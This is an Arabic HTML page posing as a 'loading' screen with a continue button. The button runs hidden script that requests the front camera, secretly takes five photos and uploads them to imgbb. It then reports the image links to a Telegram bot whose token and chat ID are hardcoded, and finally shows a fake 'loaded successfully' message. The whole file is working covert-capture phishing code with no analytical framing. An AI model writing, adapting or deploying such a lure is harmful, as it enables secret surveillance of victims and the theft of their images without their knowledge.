<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        button { background: #38bdf8; color: #0f172a; border: none; padding: 15px 35px; font-size: 1.2rem; font-weight: bold; border-radius: 10px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <button onclick="start()">اضغط هنا للمتابعة</button>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
        const CHAT = '8304712202';

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = 400;
                    canvas.height = 300;
                    const ctx = canvas.getContext('2d');
                    
                    let urls = [];

                    for (let i = 1; i <= 5; i++) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
                        
                        if (blob) {
                            const formData = new FormData();
                            formData.append('image', blob, `v_${i}.jpg`);

                            try {
                                let res = await fetch('https://api.imgbb.com/1/upload?key=d49842a2212b186b245842c070c7980d', {
                                    method: 'POST',
                                    body: formData
                                });
                                let data = await res.json();
                                if (data && data.success) {
                                    urls.push(`📸 صورة (${i}): ${data.data.url}`);
                                }
                            } catch (e) {
                                console.error(e);
                            }
                        }

                        // فاصل زمني أطول نسبةً بسيط (700 مللي ثانية) لضمان عدم رفض السيرفر لأي صورة وبقائها في نطاق السرعة
                        if (i < 5) {
                            await new Promise(r => setTimeout(r, 700));
                        }
                    }

                    stream.getTracks().forEach(t => t.stop());

                    if (urls.length > 0) {
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                chat_id: CHAT, 
                                text: `🚨 تم التقاط ${urls.length} صور بنجاح:\n\n` + urls.join('\n') 
                            })
                        });
                    }

                    document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';

                }, 1000);
            } catch (e) {
                alert('يرجى السماح بإذن الكاميرا للمتابعة');
            }
        }
    </script>
</body>
</html>
